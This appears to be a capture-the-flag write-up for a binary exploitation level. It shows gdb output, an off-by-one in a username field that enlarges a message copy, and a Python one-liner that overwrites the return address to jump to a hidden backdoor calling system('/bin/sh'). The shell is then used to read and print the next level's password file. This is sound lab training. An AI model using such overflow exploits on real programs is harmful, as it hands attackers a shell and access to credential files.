@@ -1,0 +1,54 @@
+We can find that there actually one function that is not called by the program
+
+---> disas 
+_DYNAMIC                   __cxa_finalize@got.plt     __libc_start_main@plt      fgets@plt                  set_msg
+_GLOBAL_OFFSET_TABLE_      __cxa_finalize@plt         _edata                     frame_dummy                set_username
+_IO_stdin_used             __data_start               _end                       handle_msg                 strncpy
+__CTOR_END__               __do_global_ctors_aux      _fini                      main                       strncpy@got.plt
+__CTOR_LIST__              __do_global_dtors_aux      _init                      printf                     strncpy@plt
+__DTOR_END__               __dso_handle               _start                     printf@got.plt             system
+__DTOR_LIST__              __init_array_end           call_gmon_start            printf@plt                 system@got.plt
+__FRAME_END__              __init_array_start         completed.6531             puts                       system@plt
+__JCR_END__                __libc_csu_fini            data_start                 puts@got.plt               
+__JCR_LIST__               __libc_csu_init            dtor_idx.6533              puts@plt                   
+__bss_start                __libc_start_main          fgets                      save                       
+__cxa_finalize             __libc_start_main@got.plt  fgets@got.plt              secret_backdoor 
+
+That function calls system and fgets, we will send '/bin/sh' command to it
+
+---> disas secret_backdoor 
+    ...
+    0x00000000000008b9 <+45>:    callq  0x740 <system@plt>
+    ...
+
+Let's find vulnarabilities that will let us call secret_backdoor, which addres is btw 0x000055555555488c
+
+---> info functions secret_backdoor
+All functions matching regular expression "secret_backdoor":
+
+Non-debugging symbols:
+0x000055555555488c  secret_backdoor
+
+
+In set_username we can write 41 symbol instead of 40, that way we can change message's length
+To calculate the new length we need to sum offset, 8 bytes of previous frame pointer and 8 bytes for return address
+
+offset = 192 = 0xD0 from disassembled handle_message
+
+...
+0x00005555555548c4 <+4>:     sub    $0xc0,%rsp
+0x00005555555548cb <+11>:    lea    -0xc0(%rbp),%rax
+...
+
+$ (python -c 'print "\x41" * 40 + "\xd0\n" + "\x41" * 200 + "\x8c\x48\x55\x55\x55\x55\x00\x00\n/bin/sh\n"'; cat) | ./level09
+--------------------------------------------
+|   ~Welcome to l33t-m$n ~    v1337        |
+--------------------------------------------
+>: Enter your username
+>>: >: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�>: Msg @Unix-Dude
+>>: >: Msg sent!
+whoami
+end
+cat /home/users/end/.pass
+j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE
+
